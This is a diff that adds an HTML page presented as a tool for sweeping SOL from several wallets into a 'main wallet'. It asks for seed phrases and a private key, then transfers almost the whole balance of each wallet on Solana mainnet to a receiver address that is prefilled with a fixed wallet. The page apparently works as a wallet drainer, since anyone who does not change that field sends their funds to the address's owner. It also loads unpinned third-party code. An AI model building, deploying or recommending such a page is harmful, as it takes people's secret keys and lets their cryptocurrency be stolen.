@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Sweep SOL to Main Wallet</title>
+  <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
+</head>
+<body style="font-family:sans-serif;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px;background:#f0f0f0;min-height:100vh;">
+  <h2>Send SOL from Multiple Wallets</h2>
+
+  <textarea id="seed1" rows="2" placeholder="Enter Seed Phrase 1" style="width:100%;max-width:500px;margin:10px;"></textarea>
+  <textarea id="seed2" rows="2" placeholder="Enter Seed Phrase 2" style="width:100%;max-width:500px;margin:10px;"></textarea>
+  <input id="privateKey" placeholder="Private Key (comma-separated)" style="width:100%;max-width:500px;margin:10px;padding:8px;">
+  <input id="receiver" placeholder="Your Main Wallet Address" style="width:100%;max-width:500px;margin:10px;padding:8px;" value="FjpnJG6qQpttXk2FxcFWYvmR2Tf6sGdvXKCmn8EPz7VE">
+
+  <button onclick="startSending()" style="padding:10px 20px;font-size:16px;margin-top:20px;">Start Sending</button>
+
+  <div id="status" style="margin-top:20px;max-width:600px;color:green;"></div>
+
+  <script>
+    const { Connection, Keypair, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL } = solanaWeb3;
+
+    async function getKeypairFromSeed(seedPhrase) {
+      const bip39 = await import('https://cdn.jsdelivr.net/npm/bip39@3.0.4/+esm');
+      const ed25519 = await import('https://cdn.jsdelivr.net/npm/@noble/ed25519@1.7.1/+esm');
+      const seed = await bip39.mnemonicToSeed(seedPhrase.trim());
+      const derivedSeed = seed.slice(0, 32);
+      const keypair = Keypair.fromSeed(derivedSeed);
+      return keypair;
+    }
+
+    async function sendAllSol(keypair, receiver, connection, statusDiv) {
+      try {
+        const balance = await connection.getBalance(keypair.publicKey);
+        const minBalance = 5000; // Leave a small amount for fees
+        if (balance <= minBalance) {
+          statusDiv.innerHTML += `<p>Skipping ${keypair.publicKey.toBase58()} (low balance)</p>`;
+          return;
+        }
+
+        const lamportsToSend = balance - minBalance;
+        const transaction = new Transaction().add(
+          SystemProgram.transfer({
+            fromPubkey: keypair.publicKey,
+            toPubkey: new PublicKey(receiver),
+            lamports: lamportsToSend
+          })
+        );
+
+        transaction.feePayer = keypair.publicKey;
+        transaction.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
+        const signature = await connection.sendTransaction(transaction, [keypair]);
+        await connection.confirmTransaction(signature, 'confirmed');
+        statusDiv.innerHTML += `<p>Sent from ${keypair.publicKey.toBase58()}: ${signature}</p>`;
+      } catch (err) {
+        statusDiv.innerHTML += `<p style="color:red;">Error sending from ${keypair.publicKey.toBase58()}: ${err.message}</p>`;
+      }
+    }
+
+    async function startSending() {
+      const seed1 = document.getElementById('seed1').value.trim();
+      const seed2 = document.getElementById('seed2').value.trim();
+      const privateKeyRaw = document.getElementById('privateKey').value.trim();
+      const receiver = document.getElementById('receiver').value.trim();
+      const statusDiv = document.getElementById('status');
+      statusDiv.innerHTML = "Starting...<br>";
+
+      const connection = new Connection("https://api.mainnet-beta.solana.com", "confirmed");
+
+      const keypairs = [];
+
+      if (seed1) keypairs.push(await getKeypairFromSeed(seed1));
+      if (seed2) keypairs.push(await getKeypairFromSeed(seed2));
+
+      if (privateKeyRaw) {
+        const pk = Uint8Array.from(privateKeyRaw.split(',').map(x => parseInt(x)));
+        keypairs.push(Keypair.fromSecretKey(pk));
+      }
+
+      for (let kp of keypairs) {
+        await sendAllSol(kp, receiver, connection, statusDiv);
+      }
+
+      statusDiv.innerHTML += "<p>All done.</p>";
+    }
+  </script>
+</body>
+</html>
